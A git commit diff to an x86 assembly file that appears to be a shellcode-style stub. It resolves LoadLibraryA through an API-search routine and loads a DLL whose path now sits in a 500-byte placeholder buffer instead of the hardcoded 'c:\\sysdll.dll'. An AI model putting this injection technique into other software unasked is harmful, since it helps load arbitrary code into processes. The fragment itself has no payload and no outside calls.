0f4ea7c767378e3864a2a250bf3bfd7ca42ed7b3
xxxxnnxxxx <xxxxnnxxxx@126.com>
2016-11-15 15:35:32 +0800

    update

--- loadlibrarya.asm
+++ loadlibrarya.asm
@@ -2,21 +2,29 @@
 
 [section .text]
 
+jmp _loadlibrarya_
+
+%include "search_api.asm"
+
 _loadlibrarya_:
 	pushad
-	call _load_start_
+	call 	_load_start_
 	db 'LoadLibraryA',0
 _load_start_:
-	call _str2dw
-	add esp,4h
-	push eax
-	call _GetFuncAddress
-	add esp,4h
-	call tag_dll
-	db 'c:\\sysdll.dll',0
-tag_dll:
-	call eax
+	call 	_str2dw
+	add 	esp,4h
+	push 	eax
+	call 	_GetFuncAddress
+	add 	esp,4h
+	mov 	esi,eax
+	jmp 	data
+execute:
+    pop 	eax
+    push 	eax
+	call 	esi
 	popad
-	ret
+	ret 4
+data:
+    call execute
+    times 500 db 0
 	
-	%include "search_api.asm"
